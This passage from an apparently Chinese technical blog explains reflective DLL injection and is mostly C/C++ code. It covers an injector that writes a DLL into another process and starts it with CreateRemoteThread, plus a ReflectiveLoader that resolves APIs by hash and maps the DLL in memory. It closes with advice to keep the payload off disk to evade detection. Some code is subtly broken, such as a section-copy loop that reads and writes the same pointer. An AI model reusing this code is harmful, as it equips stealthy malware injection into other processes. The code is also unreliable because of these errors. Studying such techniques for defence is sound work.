<span class="comment">//创建线程所必需的</span></div><div class="line">PROCESS_QUERY_INFORMATION |                <span class="comment">//检索有关进程的某些信息</span></div><div class="line">PROCESS_VM_OPERATION |                     <span class="comment">//需要对进程的地址空间执行操作</span></div><div class="line">PROCESS_VM_WRITE |                         <span class="comment">//需要对进程的地址空间执行写操作</span></div><div class="line">PROCESS_VM_READ,                          <span class="comment">//需要对进程的地址空间执行读操作</span></div><div class="line"><span class="literal">FALSE</span>,</div><div class="line">dwProcessId);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;向目标进程写入DLL数据<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//为需要注入的DLL在目标进程中分配空间</span></div><div class="line">LPVOID lpRemoteLibraryBuffer = <span class="literal">NULL</span>;</div><div class="line">lpRemoteLibraryBuffer=VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_EXECUTE_READ);</div><div class="line"><span class="keyword">if</span> (!lpRemoteLibraryBuffer)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"VirtualAllocEx:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//将DLL写入目标内存</span></div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"WriteProcessMemory:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用导出表获取导出函数地址ReflectiveLoader。<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (iCounter--)</div><div class="line">&#123;</div><div class="line">char* cpExportFunctionName = (char*)(uiBaseAddress + RvaToOffset(DEREF_32(uiNameArray), uiBaseAddress));</div><div class="line"><span class="regexp">//为了找到载入DLL中的导出函数ReflectiveLoader地址</span></div><div class="line"><span class="regexp">if (strstr(cpExportFunctionName, "ReflectiveLoader") != NULL)</span></div><div class="line"><span class="regexp">&#123;</span></div><div class="line"><span class="regexp">//</span>获取目标函数数组的地址</div><div class="line">uiAddressArray = uiBaseAddress + RvaToOffset<span class="function"><span class="params">(((PIMAGE_EXPORT_DIRECTORY)uiExportF0A)-&gt;AddressOfFunctions, uiBaseAddress)</span>;</span></div><div class="line"><span class="function">//获取导出函数<span class="title">ReflectiveLoader</span>的地址，计算公式<span class="title">FunAddress</span>=<span class="title">uiAddressArrary</span>+<span class="title">Orginal</span>*<span class="title">sizeof</span><span class="params">(dword)</span></span></div><div class="line"><span class="function"><span class="title">uiAddressArray</span> += <span class="params">(DEREF_16(uiNameOrdinals) * sizeof(DWORD))</span>;</span></div><div class="line"><span class="function">//返回<span class="title">offset</span></span></div><div class="line"><span class="function"><span class="title">return</span> <span class="title">RvaToOffset</span><span class="params">(DEREF_32(uiAddressArray), uiBaseAddress)</span>;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">//下一个函数名称数组</span></div><div class="line"><span class="function"><span class="title">uiNameArray</span> += <span class="title">sizeof</span><span class="params">(DWORD)</span>;</span></div><div class="line"><span class="function">//下一个函数索引数组</span></div><div class="line"><span class="function"><span class="title">uiNameOrdinals</span> += <span class="title">sizeof</span><span class="params">(DWORD)</span>;</span></div><div class="line"><span class="function">&#125;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后利用CreateRemoteThread跨线程调用ReflectiveLoader。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//使用CreateRemoteThread调用lpReflectiveLoader加载DLL</span></div><div class="line">DWORD dwThreadId = <span class="number">0</span>;</div><div class="line">HANDLE hThread = CreateRemoteThread(hProcess, NULL, <span class="number">1024</span>*<span class="number">1024</span>, lpReflectiveLoader, lpParameter, (DWORD)NULL, &amp;dwThreadId);</div><div class="line">printf(<span class="string">"CreateRemoteThread:%d<span class="subst">\n</span>"</span>, GetLastError());</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就是ReflectiveLoader的编程，ReflectiveLoader其实就是一个dll加载器。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先需要知道当前dll的基地址，而ReflectiveLoader肯定位于这个DLL中所以在此函数地址出逐次递减，然后判断是否存在MZ标志，MZ的地址就是DLL的基地址<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">uiLibraryAddress = caller();</div><div class="line">ULONG_PTR uiHeaderValue = NULL;</div><div class="line"><span class="keyword">while</span> (TRUE)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> <span class="function"><span class="params">(((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_magic == IMAGE_DOS_SIGNATURE)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">//<span class="title">NtHeaders</span>的偏移</span></div><div class="line"><span class="function"><span class="title">uiHeaderValue</span> = <span class="params">((PIMAGE_DOS_HEADER)uiLibraryAddress)</span>-&gt;</span>e_lfanew;</div><div class="line"><span class="keyword">if</span> (uiHeaderValue &gt;= sizeof(IMAGE_DOS_HEADER) &amp;&amp; uiHeaderValue &lt; <span class="number">1024</span>)</div><div class="line">&#123;</div><div class="line"><span class="regexp">//NtHeaders</span></div><div class="line"><span class="regexp">uiHeaderValue += uiLibraryAddress;</span></div><div class="line"><span class="regexp">//</span></div><div class="line"><span class="keyword">if</span> <span class="function"><span class="params">(((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;Signature == IMAGE_NT_SIGNATURE)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function"><span class="title">break</span>;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function"><span class="title">uiLibraryAddress</span>--;</span></div><div class="line"><span class="function">&#125;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着获取注射器所需要的API函数LoadLibrary，GetProcess，VirtualAlloc的地址。<br><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line">//读取LDR的链表地址</div><div class="line"><span class="function"><span class="title">uiBaseAddress</span> = <span class="params">(ULONG_PTR)((_PPEB)uiBaseAddress)</span>-&gt;</span>pLdr;</div><div class="line">USHORT usCounter = <span class="number">0</span>;</div><div class="line">ULONG_PTR uiValueC = <span class="number">0</span>;</div><div class="line">//读取InMemoryOrderModuleList的入口地址</div><div class="line">ULONG_PTR uiValueA = <span class="function"><span class="params">(LONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)</span>-&gt;</span>InMemoryOrderModuleList.Flink;</div><div class="line"><span class="keyword">while</span> (uiValueA)</div><div class="line">&#123;</div><div class="line">//DllName</div><div class="line"><span class="function"><span class="title">uiValueB</span> = <span class="params">(ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)</span>-&gt;</span>BaseDllName.pBuffer;</div><div class="line">//DllName.Length</div><div class="line"><span class="function"><span class="title">usCounter</span> = <span class="params">(USHORT)((PLDR_DATA_TABLE_ENTRY)uiValueA)</span>-&gt;</span>BaseDllName.Length;</div><div class="line">//存储的Dll Module的HASH</div><div class="line">uiValueC = <span class="number">0</span>;</div><div class="line">//计算模块名的HASH值</div><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line">uiValueC = ror((DWORD)uiValueC);</div><div class="line"><span class="keyword">if</span> (*((BYTE*)uiValueB) &gt;= <span class="string">'a'</span>)</div><div class="line">uiValueC += *((BYTE *)uiValueB) - <span class="number">0x20</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line">uiValueC += *((BYTE *)uiValueB);</div><div class="line">uiValueB++;</div><div class="line">&#125; <span class="keyword">while</span> (<span class="comment">--usCounter);</span></div><div class="line"><span class="keyword">if</span> ((DWORD)uiValueC == KERNEL32DLL_HASH)</div><div class="line">&#123;</div><div class="line">//获取导出表</div><div class="line">//<span class="number">1.</span>获取基地址(DOS头)</div><div class="line"><span class="function"><span class="title">uiBaseAddress</span> = <span class="params">(ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)</span>-&gt;</span>DllBase;</div><div class="line">//<span class="number">2.</span>获取Nt头</div><div class="line">uiExportDir = uiBaseAddress + (<span class="function"><span class="params">(PIMAGE_DOS_HEADER)</span>uiBaseAddress)-&gt;</span>e_lfanew;</div><div class="line">//<span class="number">3.</span>获取导出表数据目录</div><div class="line"><span class="function"><span class="title">uiNameArray</span> = <span class="params">(ULONG_PTR)</span>&amp;(<span class="params">(PIMAGE_NT_HEADERS)</span><span class="title">uiExportDir</span>)-&gt;</span>OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</div><div class="line">//<span class="number">4.</span>获取导出表的地址</div><div class="line">uiExportDir = uiBaseAddress + (<span class="function"><span class="params">(PIMAGE_DATA_DIRECTORY)</span>uiNameArray)-&gt;</span>VirtualAddress;</div><div class="line">//<span class="number">5.</span>获取函数名称数组</div><div class="line">uiNameArray = uiBaseAddress + (<span class="function"><span class="params">(PIMAGE_EXPORT_DIRECTORY)</span>uiExportDir)-&gt;</span>AddressOfNames;</div><div class="line">//<span class="number">6.</span>获取导出表的索引数组</div><div class="line">uiNameOrdinals = uiBaseAddress + (<span class="function"><span class="params">(PIMAGE_EXPORT_DIRECTORY)</span>uiExportDir)-&gt;</span>AddressOfNameOrdinals;</div><div class="line">usCounter = <span class="number">3</span>;</div><div class="line"><span class="keyword">while</span> (usCounter &gt; <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">dwHashValue = hash((char*)(uiBaseAddress + DEREF_32(uiNameArray)));</div><div class="line">//比较是否是LoadLibrary，GetProcAddress，VirtualAlloc的HASH</div><div class="line"><span class="keyword">if</span> (dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH)</div><div class="line">&#123;</div><div class="line">//获取指定函数的地址</div><div class="line">uiAddressArray = uiBaseAddress + (<span class="function"><span class="params">(PIMAGE_EXPORT_DIRECTORY)</span>uiExportDir)-&gt;</span>AddressOfFunctions;</div><div class="line">uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));</div><div class="line">//存储函数的VA</div><div class="line">//存储LoadLibrary的绝对地址</div><div class="line"><span class="keyword">if</span> (dwHashValue == LOADLIBRARYA_HASH)</div><div class="line">pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray));</div><div class="line">//存储GetProcAddress的绝对地址</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (dwHashValue == GETPROCADDRESS_HASH)</div><div class="line">pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + DEREF_32(uiAddressArray));</div><div class="line">//存储VirtualAlloc的绝对地址</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (dwHashValue == VIRTUALALLOC_HASH)</div><div class="line">pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress + DEREF_32(uiAddressArray));</div><div class="line">usCounter<span class="comment">--;</span></div><div class="line">&#125;</div><div class="line">uiNameArray += sizeof(DWORD);</div><div class="line">uiNameOrdinals += sizeof(DWORD);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((DWORD)uiValueC == NTDLLDLL_HASH)</div><div class="line">&#123;</div><div class="line">//获取Ntdll的基地址</div><div class="line"><span class="function"><span class="title">uiBaseAddress</span> = <span class="params">(ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)</span>-&gt;</span>DllBase;</div><div class="line">//获取NtHeader</div><div class="line"><span class="function"><span class="title">uiExportDir</span> = <span class="params">(uiBaseAddress+((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew)</span>;</span></div><div class="line"><span class="function">//获取数据目录导出表</span></div><div class="line"><span class="function"><span class="title">uiNameArray</span> = <span class="params">(ULONG_PTR)</span>&amp;(<span class="params">(PIMAGE_NT_HEADERS)</span><span class="title">uiExportDir</span>)-&gt;</span>OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</div><div class="line">//获取导出表的VA</div><div class="line"><span class="function"><span class="title">uiExportDir</span> = <span class="params">(uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress)</span>;</span></div><div class="line"><span class="function">//获取导出表函数名称数组</span></div><div class="line"><span class="function"><span class="title">uiNameArray</span> = <span class="params">(uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNames)</span>;</span></div><div class="line"><span class="function">//获取导出表函数索引数组</span></div><div class="line"><span class="function"><span class="title">uiNameOrdinals</span> = <span class="params">(uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNameOrdinals)</span>;</span></div><div class="line"><span class="function"><span class="title">usCounter</span> = 1;</span></div><div class="line"><span class="function"><span class="title">while</span> <span class="params">(usCounter &gt; <span class="number">0</span>)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">//利用导出函数名称计算<span class="title">HASH</span></span></div><div class="line"><span class="function">//<span class="title">DEREF_32</span>函数是为了将32位<span class="title">DWORD</span>转化为字符串</span></div><div class="line"><span class="function"><span class="title">dwHashValue</span> = <span class="title">hash</span>(<span class="params">(char*)(uiBaseAddress + DEREF_32(uiNameArray))</span>);</span></div><div class="line"><span class="function">//比较是否是<span class="title">ntflushinstructioncache</span>函数<span class="title">HASH</span></span></div><div class="line"><span class="function"><span class="title">if</span> <span class="params">(dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">//获取函数地址数组</span></div><div class="line"><span class="function"><span class="title">uiAddressArray</span> =<span class="title">uiBaseAddress</span> + (<span class="params">(PIMAGE_EXPORT_DIRECTORY)</span><span class="title">uiExportDir</span>)-&gt;</span>AddressOfFunctions;</div><div class="line">//根据索引找到其在函数地址数组中的地址</div><div class="line">uiAddressArray +=  ((DEREF_16(uiNameOrdinals) * sizeof(DWORD)));</div><div class="line">//存储pNtFlushInstructionCache函数的地址</div><div class="line"><span class="keyword">if</span> (dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)</div><div class="line">&#123;</div><div class="line">//RVA+BaseAddress=VA</div><div class="line">pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)(uiBaseAddress + DEREF_32(uiAddressArray));</div><div class="line">&#125;</div><div class="line">usCounter<span class="comment">--;</span></div><div class="line">&#125;</div><div class="line">//下一个函数名称数组</div><div class="line">uiNameArray += sizeof(DWORD);</div><div class="line">uiNameOrdinals += sizeof(DWORD);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">//已经找到四个函数地址VA结束第二歩</div><div class="line"><span class="keyword">if</span> (pLoadLibraryA &amp;&amp; pGetProcAddress &amp;&amp; pVirtualAlloc &amp;&amp; pNtFlushInstructionCache)</div><div class="line"><span class="keyword">break</span>;</div><div class="line">uiValueA = DEREF(uiValueA);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有了前面这几个API函数做支撑，可以将DLL文件载入到内存,这个是模拟装载器的载入，并不是单纯的读取。<br><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">//NT头</div><div class="line">uiHeaderValue = uiLibraryAddress + (<span class="function"><span class="params">(PIMAGE_DOS_HEADER)</span>uiLibraryAddress)-&gt;</span>e_lfanew;</div><div class="line">//开辟内存空间</div><div class="line">//因为是自己构架的Loader，所以没有加载kernel32.dll需要自行获取函数的地址，然后调用</div><div class="line">uiBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, </div><div class="line">(<span class="function"><span class="params">(PIMAGE_NT_HEADERS)</span>uiHeaderValue)-&gt;</span>OptionalHeader.SizeOfImage, </div><div class="line">MEM_RESERVE | MEM_COMMIT,</div><div class="line">PAGE_EXECUTE_READWRITE);</div><div class="line">//文件头大小</div><div class="line"><span class="function"><span class="title">uiValueA</span> = (<span class="params">(PIMAGE_NT_HEADERS)</span><span class="title">uiHeaderValue</span>)-&gt;</span>OptionalHeader.SizeOfHeaders;</div><div class="line">//原地址地址</div><div class="line">uiValueB = uiLibraryAddress;</div><div class="line">//目的地址</div><div class="line">uiValueC = uiBaseAddress;</div><div class="line"><span class="keyword">while</span> (uiValueA<span class="comment">--)</span></div><div class="line">*(BYTE*)uiValueC++ = *(BYTE*)uiValueB;</div><div class="line">//复制节区</div><div class="line">ULONG_PTR uiValueD=NULL;</div><div class="line"><span class="function"><span class="title">uiValueA</span> = <span class="params">(ULONG_PTR)</span>&amp;(<span class="params">(PIMAGE_NT_HEADERS)</span><span class="title">uiHeaderValue</span>)-&gt;</span>OptionalHeader + (<span class="function"><span class="params">(PIMAGE_NT_HEADERS)</span>uiHeaderValue)-&gt;</span>FileHeader.SizeOfOptionalHeader;</div><div class="line">//获取节区数目</div><div class="line">ULONG_PTR uiValueE = <span class="function">(<span class="params">(PIMAGE_NT_HEADERS)</span>uiHeaderValue)-&gt;</span>FileHeader.NumberOfSections;</div><div class="line"><span class="keyword">while</span> (uiValueE<span class="comment">--)</span></div><div class="line">&#123;</div><div class="line">//获取节区VA</div><div class="line"><span class="function"><span class="title">uiValueB</span> = <span class="params">(uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;VirtualAddress)</span>;</span></div><div class="line"><span class="function">//获取磁盘中节区的<span class="title">VA</span></span></div><div class="line"><span class="function"><span class="title">uiValueC</span> = <span class="title">uiLibraryAddress</span> + (<span class="params">(PIMAGE_SECTION_HEADER)</span><span class="title">uiValueA</span>)-&gt;</span>PointerToRawData;</div><div class="line">//获取磁盘中节区大小，不需要填充</div><div class="line"><span class="function"><span class="title">uiValueD</span> = (<span class="params">(PIMAGE_SECTION_HEADER)</span><span class="title">uiValueA</span>)-&gt;</span>SizeOfRawData;</div><div class="line">//复制</div><div class="line"><span class="keyword">while</span> (uiValueD<span class="comment">--)</span></div><div class="line">*(BYTE*)uiValueC++ = *(BYTE*)uiValueC++;</div><div class="line">//下一个节区</div><div class="line">uiValueA += sizeof(IMAGE_SECTION_HEADER);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后就是修正IAT和重定位表。修正OEP。和加壳很像！<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">//6.修正重定位表</span></div><div class="line"><span class="regexp">//</span>计算重定位信息公式：VA-ImageBase+BaseAddress</div><div class="line"><span class="regexp">//计算BaseAddress-ImageBase</span></div><div class="line"><span class="regexp">uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.ImageBase;</span></div><div class="line"><span class="regexp">//</span>获取重定位数据目录</div><div class="line"><span class="function"><span class="title">uiValueB</span> = <span class="params">(ULONG_PTR)</span>&amp;<span class="params">((PIMAGE_NT_HEADERS)uiHeaderValue)</span>-&gt;</span>OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</div><div class="line"><span class="keyword">if</span> <span class="function"><span class="params">(((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;Size)</span>   //确定重定位表是否存在值</span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">//获取重定位表<span class="title">VA</span></span></div><div class="line"><span class="function"><span class="title">uiValueC</span> = <span class="params">(uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;VirtualAddress)</span>;</span></div><div class="line"><span class="function"><span class="title">while</span> <span class="params">(((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">//获取重定位块的<span class="title">RVA</span></span></div><div class="line"><span class="function"><span class="title">uiValueA</span> = <span class="params">(uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;VirtualAddress)</span>;</span></div><div class="line"><span class="function">//获取重定位块的个数</span></div><div class="line"><span class="function"><span class="title">uiValueB</span> = <span class="params">(((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))</span> / <span class="title">sizeof</span><span class="params">(IMAGE_RELOC)</span>;</span></div><div class="line"><span class="function"><span class="title">uiValueD</span> = <span class="title">uiValueC</span> + <span class="title">sizeof</span><span class="params">(IMAGE_BASE_RELOCATION)</span>;</span></div><div class="line"><span class="function"><span class="title">while</span> <span class="params">(uiValueB--)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function"><span class="title">if</span> <span class="params">(((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_DIR64)</span></span></div><div class="line"><span class="function">*<span class="params">(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset)</span> += <span class="title">uiLibraryAddress</span>;</span></div><div class="line"><span class="function"><span class="title">else</span> <span class="title">if</span> <span class="params">(((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_HIGHLOW)</span></span></div><div class="line"><span class="function">*<span class="params">(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset)</span> += <span class="params">(DWORD)</span><span class="title">uiLibraryAddress</span>;</span></div><div class="line"><span class="function"><span class="title">else</span> <span class="title">if</span> <span class="params">(((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_HIGH)</span></span></div><div class="line"><span class="function">*<span class="params">(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset)</span> += <span class="title">HIWORD</span><span class="params">(uiLibraryAddress)</span>;</span></div><div class="line"><span class="function"><span class="title">else</span> <span class="title">if</span> <span class="params">(((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_LOW)</span></span></div><div class="line"><span class="function">*<span class="params">(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset)</span> += <span class="title">LOWORD</span><span class="params">(uiLibraryAddress)</span>;</span></div><div class="line"><span class="function">//获取下一个重定位</span></div><div class="line"><span class="function"><span class="title">uiValueD</span> += <span class="title">sizeof</span><span class="params">(IMAGE_RELOC)</span>;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function"><span class="title">uiValueC</span> = <span class="title">uiValueC</span> + <span class="params">((PIMAGE_BASE_RELOCATION)uiValueC)</span>-&gt;</span>SizeOfBlock;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="regexp">//7.调用DLL的OEP</span></div><div class="line"><span class="regexp">//</span>获取DLL的OEP</div><div class="line"><span class="function"><span class="title">uiValueA</span> = <span class="params">(uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.AddressOfEntryPoint)</span>;</span></div><div class="line"><span class="function">//刷新指令集</span></div><div class="line"><span class="function"><span class="title">pNtFlushInstructionCache</span><span class="params">((HANDLE)-<span class="number">1</span>, NULL, <span class="number">0</span>)</span>;</span></div><div class="line"><span class="function">//调用<span class="title">DLL</span>入口点</span></div><div class="line"><span class="function"><span class="params">((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL)</span>;</span></div><div class="line"><span class="function"><span class="title">return</span> <span class="title">uiValueA</span>;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下</p><ul><li>注射器的实现<ul><li>1.将待注入DLL读入自身内存(利用解密磁盘上加密的文件、网络传输等方式避免文件落地)</li><li>2.利用VirtualAlloc和WriteProcessMemory在目标进程中写入待注入的DLL文件</li><li>3.利用CreateRemoteThread等函数启动位于目标进程中的ReflectiveLoader</li></ul></li><li>ReflectiveLoader的实现，ReflectiveLoader要完成的任务是对自身的装载<ul><li>1.定位DLL文件在内存中的基址，便于后期载入内存</li><li>2.获取所需的系统API</li><li>3.分配一片用来装载DLL的空间<strong>以内存方式写入，而非文件方式</strong></li><li>4.复制PE文件头和各个节</li><li>5.处理DLL的引入表,修复重定位表</li><li>6.调用DLL入口点</li></ul></li></ul><h1 id="系统机制"><a href="#系统机制" class="headerlink" 